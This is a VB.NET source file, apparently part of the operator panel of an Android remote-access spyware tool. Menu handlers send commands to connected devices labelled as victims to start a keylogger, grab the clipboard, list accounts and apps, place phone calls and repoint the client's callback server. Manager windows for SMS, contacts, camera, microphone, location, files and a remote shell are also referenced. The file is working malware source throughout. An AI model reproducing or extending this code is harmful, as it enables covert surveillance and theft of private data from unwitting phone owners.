    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click

        FormEventArgsClosing()

    End Sub
    Private Sub ApplicationsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ApplicationsToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".apps" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.Apps & sockets.Data.SPL_SOCKET & "apps", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Private Sub EditSocketToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditSocketToolStripMenuItem.Click


        If Not Me.DGV0.SelectedRows.Count > 0 Then Exit Sub

        Dim sock As New EditSocket

        sock.StartPosition = FormStartPosition.Manual

        sock.Location = Codes.FixSize(Me, sock)

        Select Case sock.ShowDialog(Me)

            Case DialogResult.OK

                If sock.DGV0.Rows.Count > 0 Then

                    Dim ip, ports As String

                    ip = Nothing

                    ports = Nothing

                    For Each connection In sock.DGV0.Rows

                        Dim ro As String = DirectCast(connection, Windows.Forms.DataGridViewRow).Cells(0).Value.ToString()

                        Dim s As String() = ro.ToString.Trim.Split({":"}, StringSplitOptions.None)

                        ip &= s(0) & ":"

                        ports &= s(1) & ":"

                    Next

                    ip = ip.Substring(0, ip.Length - 1)

                    ports = ports.Substring(0, ports.Length - 1)

                    Dim IEnume As IEnumerator = Nothing

                    Try

                        IEnume = Me.DGV0.SelectedRows.GetEnumerator

                        Do While IEnume.MoveNext

                            Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                            Dim obj As Object() = curIndex.Tag

                            If obj IsNot Nothing Then

                                Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                                Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                                If Not classClient Is Nothing Then

                                    Dim getKey As String() = classClient.Keys.Split(":")

                                    Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "edit" & sockets.Data.SPL_DATA & ip & sockets.Data.SPL_DATA & getKey(3) & sockets.Data.SPL_DATA & ports & sockets.Data.SPL_DATA & getKey(4), Codes.Encoding().GetBytes("null"), classClient}

                                    classClient.Send(objs)

                                End If

                            End If

                        Loop

                    Finally

                        If TypeOf IEnume Is IDisposable Then

                            DirectCast(IEnume, IDisposable).Dispose()

                        End If

                    End Try


                End If

                sock.Close()

            Case Else

                sock.Close()

        End Select
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient5 & sockets.Data.SPL_SOCKET & "10000", Codes.Encoding().GetBytes("null"), classClient}

                        Remove(curIndex)

                        classClient.Rows = Nothing

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem.Click

        If Not Me.DGV0.SelectedRows.Count > 0 Then Exit Sub

        Dim p As New inp

        p.Text = "Rename victim"

        p.LTitle.Text = "add new name"

        p.InputText.Text = "Hacked"

        p.StartPosition = FormStartPosition.Manual

        p.Location = Codes.FixSize(Me, p)


        Select Case p.ShowDialog(Me)

            Case DialogResult.OK

                Dim IEnume As IEnumerator = Nothing

                Try

                    IEnume = Me.DGV0.SelectedRows.GetEnumerator

                    Do While IEnume.MoveNext

                        Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                        Dim obj As Object() = curIndex.Tag

                        If obj IsNot Nothing Then

                            Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                            Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                            If Not classClient Is Nothing Then

                                Dim getKey As String() = classClient.Keys.Split(":")

                                Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & p.InputText.Text & sockets.Data.SPL_DATA & getKey(2), Codes.Encoding().GetBytes("null"), classClient}

                                classClient.Send(objs)

                                classClient.ClientName = p.InputText.Text

                                curIndex.Cells(1).Value = p.InputText.Text

                                reso.Directory_Exist(classClient)

                            End If

                        End If

                    Loop

                Finally

                    If TypeOf IEnume Is IDisposable Then

                        DirectCast(IEnume, IDisposable).Dispose()

                    End If

                End Try

        End Select

        p.Close()

    End Sub
    Private Sub AcquirePowerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AcquirePowerToolStripMenuItem.Click

        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient10 & sockets.Data.SPL_SOCKET & SecurityKey.acquire & sockets.Data.SPL_ARRAY & "power", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub
    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click



        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient5 & sockets.Data.SPL_SOCKET & "-1", Codes.Encoding().GetBytes("null"), classClient}

                        Remove(curIndex)

                        classClient.Rows = Nothing

                        classClient.Send(objs)



                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Private Sub AccountManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AccountManagerToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.Account & sockets.Data.SPL_SOCKET & "account", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Private Sub InformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InformationToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.Information & sockets.Data.SPL_SOCKET & "information", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub


    Public Sub Remove(ByVal row As Windows.Forms.DataGridViewRow)

        If Me.InvokeRequired Then

            Me.Invoke(Sub() Remove(row))

            Exit Sub

        Else

            Try

                Dim Forms As String = "null"

                If row IsNot Nothing Then

                    Forms = CStr(row.Cells(6).Tag)

                    DGV0.Rows.Remove(row)

                End If

                If Not Forms = "null" Then

                    Dim handle As String = "Calls_Manager_" & Forms
                    Dim FM As Form = My.Application.OpenForms(handle)

                    Dim CS As String() = {"Close windows", "Disconnected ---> "}
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If

                    handle = "SMS_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If

                    handle = "Contacts_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "Camera_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If
                    handle = "File_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "Microphone_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "Shell_Terminal_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "Location_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "Applications_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "Account_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "informations_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If


                    handle = "Keylogger_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If

                    handle = "Clipboard_Manager_" & Forms
                    FM = My.Application.OpenForms(handle)
                    If FM IsNot Nothing Then
                        If Not FM.IsDisposed Then
                            If SpySettings.DISCONNECTED = CS(0) Then
                                FM.Close()
                            Else
                                Dim FTEXT As String = FM.Text
                                FM.Text = CS(1) & FTEXT
                            End If
                        End If
                    End If

                End If


            Catch xErrors As Exception


            End Try

        End If

    End Sub

    Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs) Handles BoxTitle.Paint

        If BoxTitlePaintEventArgsWait Then

            Dim processing As Integer = infoServer.RequestsReceiver.Count +
                infoServer.RequestsSender.ListWorker.Count + infoServer.WorkerRequests.Count

            Dim _Processing As String = "Ongoing Operations " & CStr(processing)

            Dim ary As Array = UploadDownload(infoServer.BytesSent, infoServer.BytesReceived)

            Dim _Received As String = "Received " & CStr(ary.GetValue(0))

            Dim _Sent As String = "Sent " & CStr(ary.GetValue(1))

            Dim counp As Integer = infoServer.PORTS.Trim.Split(Space(1)).Length

            Dim _Ports As String = If(counp > 1, "Ports " & infoServer.PORTS.Trim, "Port " & infoServer.PORTS.Trim)

            Dim _Online As String = "Online " & CStr(DGV0.Rows.Count)

            Dim clr As Color = SpySettings.DefaultColor_Foreground

            e.Graphics.DrawLine(New Pen(Color.FromArgb(50, clr.R, clr.G, clr.B)), 0, 1, BoxTitle.Width, 1)

            Dim ColorFont As Brush

            ColorFont = New SolidBrush(SpySettings.DefaultColor_Foreground)

            Dim ColorBack As Brush = New SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B))

            Dim TextRender0 As Size = TextRenderer.MeasureText(_Online, reso.f)

            Dim TextRender1 As Size = TextRenderer.MeasureText(_Processing & Space(10) & _Received & _Sent, reso.f)

            Dim rect0 As New Rectangle(0, 2, BoxTitle.Width, TextRender1.Height + 5)

            e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect0)

            e.Graphics.DrawString(_Processing & Space(5) & _Received & Space(3) & _Sent, reso.f, ColorFont, 0, 2)

            Dim aMid As Integer = CInt(BoxTitle.Width / 2)

            Dim aEnd As Integer = BoxTitle.Width - TextRender0.Width

            Dim TextRender2 As Size = TextRenderer.MeasureText(_Ports, reso.f)

            Dim rect1 As New Rectangle(aMid + 100, 2, BoxTitle.Width, TextRender2.Height + 5)

            e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect1)

            e.Graphics.DrawString(_Ports, reso.f, ColorFont, aMid + 100, 2)

            Dim rect2 As New Rectangle(aEnd, 2, BoxTitle.Width, TextRender0.Height + 5)

            e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect2)

            e.Graphics.DrawString(_Online, reso.f, ColorFont, aEnd, 2)


            Dim MeSize As Size = TextRenderer.MeasureText("S", reso.f)
            If Not BoxTitle.Height = MeSize.Height + 3 Then
                BoxTitle.Height = MeSize.Height + 3
            End If
        End If

    End Sub
    Private Sub AngelAndroidForm_Activated(sender As Object, e As EventArgs) Handles Me.Activated

        EventArgsActivated = True

        BoxTitle.Invalidate()

    End Sub
    Private Sub AngelAndroidForm_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate

        EventArgsActivated = False

        BoxTitle.Invalidate()

    End Sub
    Private Sub BoxTitle_Resize(sender As Object, e As EventArgs) Handles BoxTitle.Resize

        BoxTitle.Invalidate()

    End Sub

    Private Sub DGV0_CellMouseDoubleClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DGV0.CellMouseDoubleClick

        If e.RowIndex >= 0 AndAlso e.ColumnIndex >= 0 Then

            Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(DGV0.Rows(e.RowIndex), Windows.Forms.DataGridViewRow)

            Dim obj As Object() = curIndex.Tag

            If obj IsNot Nothing Then

                Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                If Not classClient Is Nothing Then

                    Dim down As String = classClient.FolderUSER

                    If Not IO.Directory.Exists(down) Then

                        IO.Directory.CreateDirectory(down)

                    End If

                    Process.Start(down)

                End If

            End If

        End If

    End Sub

    Protected Overrides Sub WndProc(ByRef m As Message)

        Select Case m.Msg
            Case &HA1
                If m.WParam = &H3 Then
                    EventMenuClick(False)
                    Return
                End If
            Case &HA4
                If m.WParam = &H3 Or
                    m.WParam = &H2 Or
                    m.WParam = &H9 Or
                    m.WParam = &H8 Or
                    m.WParam = &H14 Then
                    EventMenuClick(True)
                    Return
                End If
            Case &HA3
                If m.WParam = &H3 Then
                    Return
                End If
        End Select
        MyBase.WndProc(m)
    End Sub
    Private Sub EventMenuClick(ByVal DefaultLocation As Boolean)
        If DefaultLocation Then
            Dim cur As Point = Cursor.Position
            ctxMu.Show(cur.X, cur.Y)
        Else
            ctxMu.Show(Me.Location.X - ctxMu.Width, Me.Location.Y)
        End If
    End Sub

    Private Sub DGV0_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.CellContentClick

    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        classClient.Keylogg = True

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient8 & sockets.Data.SPL_SOCKET & SecurityKey.Keylogger & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & "(unknown)", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)


                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Private Sub CallPhoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CallPhoneToolStripMenuItem.Click


        If Not Me.DGV0.SelectedRows.Count > 0 Then Exit Sub

        Dim CP As New CallPhone

        CP.L0.Text = "add Number"

        CP.StartPosition = FormStartPosition.Manual

        CP.Location = Codes.FixSize(Me, CP)

        Dim num As String = Nothing

        Dim Flag As String = Nothing

        If CP.ShowDialog() = DialogResult.OK Then

            num = CP.TextBox1.Text

            Flag = CP._Call

        Else

            CP.Close()

            GoTo SKIP

        End If

        CP.Close()


        If num = Nothing Then

            GoTo SKIP

        Else

            Dim IEnume As IEnumerator = Nothing

            Try

                IEnume = Me.DGV0.SelectedRows.GetEnumerator

                Do While IEnume.MoveNext

                    Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                    Dim obj As Object() = curIndex.Tag

                    If obj IsNot Nothing Then

                        Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                        Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                        If Not classClient Is Nothing Then

                            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & Flag & sockets.Data.SPL_DATA & "tel:" & num.Trim, Codes.Encoding().GetBytes("null"), classClient}

                            classClient.Send(objs)

                        End If

                    End If

                Loop

            Finally

                If TypeOf IEnume Is IDisposable Then

                    DirectCast(IEnume, IDisposable).Dispose()

                End If

            End Try

        End If

SKIP:

    End Sub

    Private Sub ClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClipboardToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getClipboard & sockets.Data.SPL_SOCKET & "get" & sockets.Data.SPL_DATA & "null", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub

    Public WU As Win_Users
    Private Sub UsersToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UsersToolStripMenuItem.Click
        If WU Is Nothing Then
            WU = New Win_Users
            Dim users_ As String = reso.res_Path & "\Users"
            If IO.Directory.Exists(users_) Then
                Dim Dirs() As String = IO.Directory.GetDirectories(users_)
                For Each Dir As String In Dirs
                    Dim dr As New IO.DirectoryInfo(Dir)
                    Dim user_file As String = dr.FullName & "\user.info"
                    If IO.File.Exists(user_file) Then
                        Try
                            Dim Ln As String() = IO.File.ReadAllLines(user_file)
                            If Ln.Length = 3 Then
                                Dim getPath As String = reso.res_Path & "\Icons\FillEllipse\User.png"
                                WU.DGV0.Rows.Add(Ln(0), Ln(2) & " /ip:" & Ln(1), dr.Name, reso.GetEllImage(0, {getPath, 15, 15, 17, 17}))
                            End If
                        Catch ex As Exception
                        End Try
                    End If
                Next
            End If
            WU.DGV0.Columns(3).Width = reso.IconsSize
            WU.DGV0.Columns(3).DisplayIndex = 0
            WU.StartPosition = FormStartPosition.Manual
            WU.Location = Codes.FixSize(Me, WU)
            WU.Show()
        End If

    End Sub

    Private Sub ctxMenu_Opening(sender As Object, e As CancelEventArgs) Handles ctxMenu.Opening
        Dim ver As String = ""
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(DGV0.Rows(DGV0.SelectedRows(i).Index), Windows.Forms.DataGridViewRow)
                Dim obj As Object() = curIndex.Tag
                If obj IsNot Nothing Then
                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)
                    If Not classClient Is Nothing Then
                        ver = classClient.VersionClient
                    End If
                End If
            Next
        End If
        Select Case ver
            Case "v1.0"
                CallPhoneToolStripMenuItem.Visible = False
                KeyloggerToolStripMenuItem.Visible = False
                AcquirePowerToolStripMenuItem.Visible = False
                MinimumPowerToolStripMenuItem.Visible = False
            Case Else
                CallPhoneToolStripMenuItem.Visible = True
                KeyloggerToolStripMenuItem.Visible = True
                AcquirePowerToolStripMenuItem.Visible = True
                MinimumPowerToolStripMenuItem.Visible = True
        End Select
    End Sub

    Private Sub MinimumPowerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MinimumPowerToolStripMenuItem.Click
        Dim IEnume As IEnumerator = Nothing

        Try

            IEnume = Me.DGV0.SelectedRows.GetEnumerator

            Do While IEnume.MoveNext

                Dim curIndex As Windows.Forms.DataGridViewRow = DirectCast(IEnume.Current, Windows.Forms.DataGridViewRow)

                Dim obj As Object() = curIndex.Tag

                If obj IsNot Nothing Then

                    Dim classClient As sockets.Client = DirectCast(obj(0), sockets.Client)

                    Dim cClient As Net.Sockets.TcpClient = DirectCast(obj(1), Net.Sockets.TcpClient)

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {cClient, SecurityKey.KeysClient6 & sockets.Data.SPL_SOCKET & SecurityKey.acquire & sockets.Data.SPL_ARRAY & "release", Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Loop

        Finally

            If TypeOf IEnume Is IDisposable Then

                DirectCast(IEnume, IDisposable).Dispose()

            End If

        End Try
    End Sub
End Class